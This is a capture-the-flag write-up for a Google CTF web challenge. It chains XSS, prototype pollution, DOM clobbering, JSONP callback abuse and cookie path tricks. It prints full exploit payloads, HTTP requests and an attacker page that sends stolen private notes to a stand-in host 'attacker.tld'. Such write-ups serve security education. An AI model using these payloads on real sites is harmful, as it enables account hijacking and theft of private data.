# All The Little Things (fixed version)
Description
```
I left a little secret in a note, but it's private, private is safe.
Note: TJMike🎤 from Pasteurize is also logged into the page.
https://littlethings.web.ctfcompetition.com
```

The task contains 2 sites with notes:
 * `pasteurize.web.ctfcompetition.com` public notes, with the ability to share content to the user TJMike
 * `fixedthings-vwatzbndzbawnsfs.web.ctfcompetition.com` private notes

Since we can interact with the XSS bot only through `pasteurize`, the attack should start from public notes.

## Pasteurize
Node.JS Express application with source code
```
https://pasteurize.web.ctfcompetition.com/source
```
```js
app.use(bodyParser.urlencoded({extended: true}));
...
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
...

app.post('/', async (req, res) => {
  const note = req.body.content;
  ...
  const result = await DB.add_note(note_id, note);
  
...
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);
  ..
  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);
```

The application uses `body-parser` library with the `extended` option to handle POST body.
Extended option determines which library will be used to parse the urlencoded string `qs` or `querystring`.

| POST Body            | extended: false           | extended: true            |
|----------------------|---------------------------|---------------------------|
| test=test            | {test: 'test'}            | {test: 'test'}            |
| test[]=test          | {'test[]': 'test'}        | {test: ['test']}          |
| test=test&test=test2 | {test: ['test', 'test2']} | {test: ['test', 'test2']} |

The `escape_string` function expects only a string in the input parameters, and if `content` contains an array, the processing logic is violated and the attacker can execute arbitrary JS code.

```js
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```
Example
```js
console.log('const node="%s"', escape_string('test'));

const node="test"

console.log('const node="%s"', escape_string(['test']));

const node=""test""
```

HTTP Request
```http
POST / HTTP/1.1
Host: pasteurize.web.ctfcompetition.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

content[]=-alert(123)-
```

Result
```js
const note = ""-alert(123)-"";
```

But as you can see from the table above - the extended `body-parser` format is optional and the array can also be sent using several variables with the same key.

HTTP Request
```http
POST / HTTP/1.1
Host: pasteurize.web.ctfcompetition.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

content=-alert(123)//&content=x
```

Result
```js
const note = ""-alert(123)//","x"";
```

## All The Little Things
The application allows you to create private notes visible only to the current user.

By default, the application loads the user from a JSON object that returns `/me` endpoint.
```js
window.addEventListener('DOMContentLoaded', ()=>{
    fetch('/me').then(e => e.json()).then(make_user_object);
}

...

class User {
    #username; #theme; #img
    constructor(username, img, theme) {
        this.#username = username
        this.#theme = theme
        this.#img = img
    }
    get username() {
        return this.#username
    }

    get img() {
        return this.#img
    }

    get theme() {
        return this.#theme
    }

    toString() {
        return `user_${this.#username}`
    }
}

function make_user_object(obj) {

    const user = new User(obj.username, obj.img, obj.theme);
    window.load_debug?.(user);
    ...
```

`/me` endpoint
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"username":"guest","img":"/static/images/anonymous.png","theme":{"cb":"set_light_theme","options":{}}}
```

### Debug version

On the settings page there is a hint about debug version of the application, which is enabled by adding a parameter to the query-string.
```html
<!-- ?__debug__ -->
```

In the debug version, script `/static/scripts/debug.js` is added to all application pages, allowing an attacker to change user's loading logic.
```js
class Debug {
    #username;
    constructor(username="") {
        this.#username = username
    }
    toString() {
        return `debug_${this.#username}`
    }
}

// Extend user object
function load_debug(user) {
    let debug;
    try {
        debug = JSON.parse(window.name);
    } catch (e) {
        return;
    }

    if (debug instanceof Object) {
        user.debug = new Debug(user.username);
        Object.assign(user.debug, debug);
    }

    if(user.debug.debugUser){
        user.toString = () => user.debug.toString();
    }
    
    if(user.debug.verbose){
        console.log(user);
        console.log(user.debug);
    }
```

### User object

When user object is loaded, the application stores this object in `document` and calls the `update_theme` function. This function calls the JSONP callback stored in user object to set the selected theme.

```js
function make_user_object(obj) {
    ... 
    window.USERNAME = user.toString();
    document[window.USERNAME] = user;
    update_theme();
}

function update_theme() {
    const theme = document[USERNAME].theme;
    const s = document.createElement('script');
    s.src = `/theme?cb=${theme.cb}`;
    document.head.appendChild(s);
}
```

```js
{"username":"guest","img":"/static/images/anonymous.png","theme":{"cb":"set_light_theme","options":{}}}
```

As a result, the following endpoint will be called `/theme?cb=set_light_theme`
```
set_light_theme({"version":"b1.13.7","timestamp":1598432753476})
```

The callback value is filtered, only characters that match the regular expression `[.=0-9A-Z_a-z]` can be used. Thus, if attacker overrides the callback value, this will make it possible to execute one arbitrary function or assignment.

### Window name

To start exploiting vulnerabilities, an attacker needs to set `window.name` property.  
This can be achieved through:

 * `<iframe name="*attacker-controlled*" src="//task"></iframe>` (blocked via `X-Frame-Options: DENY`)
 * `window.open('//task', '*attacker-controlled*')` (must be triggered by a direct user action, otherwise it will be blocked)
 * Open a page controlled by the attacker, set `window.name`, redirect to the task
 
 Under these conditions, only the last option will work.

### Prototype Pollution

Using `window.name`, attacker can override the `theme` value in the `user` object.

```js
debug = JSON.parse(window.name);
...
Object.assign(user, debug);
```

Example:
```js
user = {"theme":{"cb":"test"}}
Object.assign(user, JSON.parse('{"theme":{"cb":"alert"}}'))

user.theme.cb == "alert"
```

To protect against this, the class `User` uses private fields with getters only.
```js
class User {
    #theme;
    constructor(theme) {
        this.#theme = theme
    }

    get theme() {
        return this.#theme
    }
}

user = new User({"cb":"test"})
Object.assign(user, JSON.parse('{"theme":{"cb":"alert"}}'))

// Uncaught TypeError: Cannot set property theme of #<User> which has only a getter
```

But this can be exploited using the Prototype Pollution
```js
Object.assign(user, JSON.parse('{"__proto__":{"theme":{"cb":"alert"}}}'))

user.theme.cb == "alert"
```

In the fixed version of the task, attacker cannot directly overwrite the callback of main object and can only affect `user.toString()`.

```js
debug = JSON.parse(window.name);
...
user.debug = new Debug(user.username);
Object.assign(user.debug, debug);
...
if(user.debug.debugUser){
  user.toString = () => user.debug.toString();
}
```

By default, `toString()` function of user object returns a value with `user_` prefix
```js
toString() {
  return `user_${this.#username}`
}
```

In order to return an arbitrary value, attacker can use an array as `__proto__`, for example:
```
{"debugUser":"true","__proto__":["foobar"]}

user.toString() == "foobar"
```

### DOM Clobbering

As a result of exploiting Prototype Pollution, attacker can define any `document` field, but only if it is undefined.

```js
function is_undefined(x) {
    return typeof x === "undefined" && x == undefined
}
...
// make sure to not override anything
if (!is_undefined(document[user.toString()])) {
  return false;
}
...
window.USERNAME = user.toString();
document[window.USERNAME] = user;
```

If we check which of the document fields meet these conditions, we get the following.

```js
for (name in document) {
  if (typeof document[name] === "undefined")
   console.log(`document.${name}`);        
}

document.all
```

`document.all` is a read-only field that contains every element in the document (Hint was in the name of the task all this time). So if `user.toString()` will return `all`:

```
document["all"] = user;
...
theme = document.all.theme;
...
callback = document.all.theme.cb;
```

Now we need to return to the main function of the application - private notes.
```html
<script nonce="e75a76cccb1884de">
  const note = "test";
  const note_id = "a80b5c6c-35e4-4f35-8654-d6273078b39d";
  const note_el = document.getElementById('note-content');
  const note_url_el = document.getElementById('note-title');
  const clean = DOMPurify.sanitize(note);
  note_el.innerHTML = clean;
  note_url_el.href = `/note/${note_id}`;
  note_url_el.innerHTML = `${note_id}`;
</script>
```

The content of the notes is filtered using DOMPurify, but the `id` and `name` attributes are available for use. To exploit the vulnerability and overwrite the callback, an attacker needs to create a `document.all.theme.cb` field that returns a controlled value when cast to a string.

Example:
```
<a href="http://test/" id="theme" name="cb"/>
<b id="theme"/>
```

`document.all.theme` will return an HTMLCollection since there are two elements in the DOM with id = theme.

![HTMLCollection](https://i.imgur.com/l4ipTEq.png)!

`document.all.theme.cb.toString()` will return `http://test/`

The result of this combination of DOM Clobbering and Prototype Pollution is the next request `/theme?cb=http://test/`
```
httptest({"version":"b1.13.7","timestamp":1598432753476})
```

At this stage, we cannot use
```js
location=something.that.return.javascript.scheme({"version":"b1.13.7","timestamp":1598432753476})
```
since the application uses CSP
```
Content-Security-Policy: default-src 'none';script-src 'self' 'nonce-7a731d73bf5857d7';...
```

But we can overwrite the `innerHTML` of an arbitrary element using
```html
<a href="https://test/?x=document.body.firstElementChild.innerHTML=window.name.toString" id="theme" name="cb"/>
<b id="theme"/>
```
```js
httpstestx=document.body.firstElementChild.innerHTML=window.name.toString({"version":"b1.13.7","timestamp":1598439920882})
```

### Self XSS

Since `<script src>` will not work directly from innerHTML, it is possible to wrap it in iframe srcdoc.
```html
<iframe srcdoc='<script src=/theme?cb=alert></script>'></iframe>
```

Using callback chaining is possible:
 * Create script element in iframe
 * Steal a valid nonce from the parent page and set it in an iframe script
 * Set script content via innerHTML
 
Exploit:
```html
<script>
	ifrs  = [
		"<iframe name=xss srcdoc='<script charset=fetch(&#x22;/note/&#x22;).then(x=&amp;gt;x.text()).then(x=&amp;gt;parent.location=&#x22;//attacker.tld?c=&#x22;+btoa(x))><\/script>'></iframe> ",
		"<iframe srcdoc=\'<script src=/theme?cb=parent.xss.document.head.lastElementChild.nonce=parent.document.body.lastElementChild.nonce.valueOf><\/script>\'></iframe>",
		"<iframe srcdoc=\'<script src=/theme?cb=parent.xss.document.head.lastElementChild.innerHTML=parent.xss.document.head.lastElementChild.charset.toString><\/script>\'></iframe>",
	];
  window.name='{"debugUser":true,"showAll":true,"x":"'+ifrs.join()+'","keepDebug":true,"verbose":true,"__proto__":["all"]}';

  location='https://fixedthings-vwatzbndzbawnsfs.web.ctfcompetition.com/note/*ATTACKER_PRIVATE_NODEID*?__debug__';
</script>
```

And, we got Self-XSS, this report is not eligible for a bounty, closed.

### XSS

In the last step, we need to make the private note available to the XSS bot. Since there is XSS on `pasteurize.web.ctfcompetition.com`, an attacker can set a cookie on `*.web.ctfcompetition.com`, which will be available on `fixedthings-vwatzbndzbawnsfs.web.ctfcompetition.com`.

When checking authorization, task web server uses the first cookie in the HTTP header as a result. Since we are not overwriting the existing `session` and `session.sig` cookies, but adding another one, we need to set up the attributes which will make our cookies to be the first among others. Browsers sort cookies by the date they were added and by the matching path attribute prefix.

If the attacker adds the following cookies:
```
document.cookie='session.sig=*ATTACKER_SIG*; domain=.web.ctfcompetition.com; path=/note/foobar'
document.cookie='session=*ATTACKER_SESSION*; domain=.web.ctfcompetition.com; path=/note/foobar'
```

On HTTP request `/note/foobar`, the attacker's cookie will be sent first and the web server will authorize the user to the attacker's profile. For any other HTTP requests, the XSS bot will be authorized as usual.

### Final Exploit

* Create private note in attacker profile with DOM Clobbering

```html
<a href="https://test/?x=document.body.firstElementChild.innerHTML=window.name.toString" id="theme" name="cb">x</a>
<b id="theme"/>
```

* Create public note with XSS

```http
POST / HTTP/1.1
Host: pasteurize.web.ctfcompetition.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

content[]="-(document.cookie='session.sig=*ATTACKER_SIG*; domain=.web.ctfcompetition.com; path=/note/*ATTACKER_PRIVATE_NODEID*',document.cookie='session=*ATTACKER_SESSION*; domain=.web.ctfcompetition.com; path=/note/*ATTACKER_PRIVATE_NODEID*',location='https://attacker.tld/part2.html')-"
```

* Attacker site

```html
<script>
  ifrs  = [
    "<iframe name=xss srcdoc='<script charset=fetch(&quot;/note&quot;).then(x=&amp;gt;x.text()).then(x=&amp;gt;parent.location=&quot;//attacker.tld?c=&quot;+btoa(x))><\/script>'></iframe> ",
    "<iframe srcdoc=\'<script src=/theme?cb=parent.xss.document.head.lastElementChild.nonce=parent.document.body.lastElementChild.nonce.valueOf><\/script>\'></iframe>",
    "<iframe srcdoc=\'<script src=/theme?cb=parent.xss.document.head.lastElementChild.innerHTML=parent.xss.document.head.lastElementChild.charset.toString><\/script>\'></iframe>",
  ];
  window.name='{"debugUser":true,"showAll":true,"x":"'+ifrs.join()+'","keepDebug":true,"verbose":true,"__proto__":["all"]}';

  location='https://fixedthings-vwatzbndzbawnsfs.web.ctfcompetition.com/note/*ATTACKER_PRIVATE_NODEID*?__debug__';
</script>
```

**Flag:** As for a reward, here comes your juicy flag **CTF{twitter.com/terjanq}**